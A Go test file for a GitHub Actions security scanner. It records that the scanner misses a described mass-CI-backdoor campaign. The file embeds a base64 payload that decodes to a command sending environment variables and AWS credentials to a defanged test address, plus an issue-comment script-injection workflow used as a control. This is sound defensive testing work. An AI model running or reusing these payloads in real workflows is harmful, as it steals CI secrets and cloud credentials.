package cli

// Attack 2026-33: Megalodon mass CI backdoor (2026-05-18). 5,718 commits
// pushed with one token to 5,561 repos added a workflow whose run: step was
// `echo <base64> | base64 -d | bash`, harvesting runner credentials,
// /proc/*/environ and cloud metadata to 216.126.225.129:8443. Two variants:
// SysDiag (push + pull_request_target) and Optimize-Build (workflow_dispatch,
// a dormant backdoor).
//
// NOT COVERED, asserted as current behaviour: LintWorkflow looks for three
// trigger shapes (pwn request, unguarded comment trigger, ${{ }} injection)
// and none is present — the payload is a literal in the run: step. With no
// uses: refs there is nothing for the Actions scanner either, so scan-actions
// exits 0 even at --fail-on low, and pr-scan's diffWorkflow produces no row.
// The commits were direct pushes, so a PR gate would not have run anyway.
// The payload IP below is TEST-NET (192.0.2.10), defanged.

import "testing"

const atk33Payload = "Y2F0IC9wcm9jLyovZW52aXJvbiB+Ly5hd3MvY3JlZGVudGlhbHMgMj4vZGV2L251bGwgfCBjdXJsIC1zIC0tZGF0YS1iaW5hcnkgQC0gaHR0cDovLzE5Mi4wLjIuMTA6ODQ0My9j"

func TestAttack2026_33_MegalodonWorkflowBackdoor(t *testing.T) {
	variants := map[string]string{
		"sysdiag.yml": `name: SysDiag
on:
  push:
  pull_request_target:
jobs:
  diag:
    runs-on: ubuntu-latest
    steps:
      - name: Collect diagnostics
        run: echo "` + atk33Payload + `" | base64 -d | bash
`,
		"optimize-build.yml": `name: Optimize-Build
on:
  workflow_dispatch:
jobs:
  optimize:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
    steps:
      - name: ci build optimization step
        run: echo "` + atk33Payload + `" | base64 -d | bash
`,
	}
	for name, body := range variants {
		code, r, err := runScanActionsJSON(t, atk26WriteWF(t, name, body), "low")
		if err != nil {
			t.Fatal(err)
		}
		if code != 0 || len(r.Findings) != 0 {
			t.Fatalf("%s: scan-actions now flags a base64|bash run: step (exit %d, %+v); update the attack-33 classification", name, code, r.Findings)
		}
		added, upgraded, err := diffWorkflow(".github/workflows/"+name, nil, []byte(body))
		if err != nil || len(added)+len(upgraded) != 0 {
			t.Fatalf("%s: pr-scan produced rows %+v %+v (%v); update the attack-33 classification", name, added, upgraded, err)
		}
	}

	// Harness control: the same scan does report a structural lint finding,
	// so the zero above is the lint's coverage, not a broken harness.
	ctl := atk26WriteWF(t, "ctl.yml", `on: [issue_comment]
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.comment.body }}" | base64 -d | bash
`)
	if code, r, _ := runScanActionsJSON(t, ctl, ""); code != 1 || atk26Sigs(r)["action.script_injection"] != "high" {
		t.Fatalf("control: want script_injection, exit 1; got %d %+v", code, r.Findings)
	}
}
